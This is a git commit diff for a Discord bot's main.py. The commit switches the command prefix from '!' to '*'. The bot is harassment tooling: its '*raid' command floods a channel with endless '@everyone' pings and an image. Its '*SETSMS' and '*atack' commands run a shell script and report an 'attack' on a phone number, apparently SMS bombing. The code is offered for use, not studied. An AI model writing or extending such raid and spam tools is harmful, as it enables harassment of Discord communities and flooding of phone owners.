c0b2f97310a14bd8e61b8388c0e68c3f209bc8cc
pai <69026987+ELPanaJose@users.noreply.github.com>
2021-02-15 15:33:50 -0500

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ client = discord.Client()
 
 @client.event
 async def on_ready():
-    print('logged in as {0.user}'.format(client))
+    print('main.py ready! {0.user}'.format(client))
 
 @client.event
 async def on_message(message):
@@ -19,25 +19,22 @@ async def on_message(message):
     emojis = ('@everyone')
     gif = ('https://media.discordapp.net/attachments/807053711871443024/809997406677630996/neutral_face.png?width=458&height=458')
 
-    if message.content.startswith('!raid', print(chr(27)+"[1;33m"+"the raid begin")):
+    if message.content.startswith('*raid', print(chr(27)+"[1;33m"+"the raid begin")):
         while True:
             await message.channel.send(emojis)
             await message.channel.send(gif)
 
-    if message.content.startswith('!ayuda'):
+    if message.content.startswith('*ayuda'):
         await message.channel.send(ayuda)
 
-    if message.content.startswith('!sr'):
+    if message.content.startswith('*sr'):
         exit(print("raid over"))
 
-    if message.content.startswith('!neofetch'):
-        await message.channel.send(neofetch)
-
-    if message.content.startswith('!SETSMS'):
+    if message.content.startswith('*SETSMS'):
         os.system("cd SETSMS ; bash SETSMS.sh")
         await message.channel.send("esta en SETSMS!")
 
-    if message.content.startswith('!atack'):
+    if message.content.startswith('*atack'):
         await message.channel.send(f"se ataco a : ||{numero}|| se demora unos 3-4 minutos")
 
     if message.content.startswith('test'):
